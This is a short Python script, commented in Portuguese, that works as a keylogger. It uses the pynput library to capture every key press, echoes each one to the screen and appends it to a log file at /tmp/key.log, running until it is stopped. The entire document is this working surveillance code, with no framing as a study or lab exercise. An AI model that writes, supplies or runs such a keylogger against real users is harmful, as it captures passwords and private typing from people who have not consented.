from pynput.keyboard import Listener

#funçao criada para capturar
arquivoLog = "/tmp/key.log" #caminho para salvar o log

def capturar(tecla):
	tecla = str(tecla)
	print(tecla)

	with open(arquivoLog, "a") as log:
		log.write(tecla)

#Comando para ficar rodando constante
with Listener( on_press = capturar ) as l:
	l.join()
